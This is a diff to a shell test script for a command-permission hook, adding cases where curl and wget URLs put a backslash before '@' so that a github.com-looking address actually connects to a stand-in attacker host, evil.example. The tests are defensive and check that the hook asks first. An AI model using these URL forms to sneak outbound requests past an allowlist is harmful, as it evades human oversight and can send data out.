@@ -184,6 +184,10 @@ check_bash "allowlisted user@ host"     ask   "curl -s https://api.github.com@ev
 check_bash "second URL off the list"    ask   "curl -s https://github.com/a https://evil.example/b"
 check_bash "two allowlisted URLs"       allow "curl -s https://github.com/a https://pypi.org/b"
 check_bash "loopback then remote"       ask   "curl -s http://127.0.0.1:8090/ https://evil.example/"
+# Quoted, the shell keeps the backslash and curl connects to the host after the @.
+check_bash "backslash before @, quoted" ask   "curl -s 'https://github.com\@evil.example/?d=1'"
+check_bash "backslash before @, wget"   ask   "wget -q 'https://github.com\@evil.example/?d=1'"
+check_bash "backslash in the path"      allow "curl -s 'https://api.github.com/repos/a/b\?per_page=1'"
 
 echo ""
 echo "=== this machine's allowlist (local-settings netAllowlist) ==="
